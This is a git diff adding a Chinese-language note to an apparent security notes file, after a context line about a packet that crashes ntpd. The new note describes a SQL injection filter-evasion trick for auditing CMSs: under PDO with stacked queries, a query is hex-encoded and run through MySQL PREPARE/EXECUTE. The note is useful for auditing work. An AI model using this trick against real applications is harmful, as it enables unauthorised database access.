@@ -180,3 +180,33 @@ Sent 1 packets.
 
 接受到这个特殊的数据包，ntpd崩溃，形成拒绝服务
 ```
+
+### 分享一个SQL注入的技巧
+```
+审计开源框架/cms的时候可能会遇到一些有意思的注入漏洞
+当以pdo的方式连接mysql，也就是说可以多语句执行的时候
+然后，参考如下：
+
+python:
+import binascii
+s='select * from x limit 1;'
+
+print binascii.b2a_hex(s)
+# 获得16进制数据，73656c656374202a2066726f6d2078206c696d697420313b
+
+mysql -uroot
+set @a:=0x73656c656374202a2066726f6d2078206c696d697420313b;
+
+prepare s from @a;
+
+execute s;
+
+mysql root@localhost:test> execute s;
++------+----------+-------+
+|   id |   is_reg |   pid |
+|------+----------+-------|
+|    1 |        1 |     0 |
++------+----------+-------+
+1 row in set
+Time: 0.002s
+```
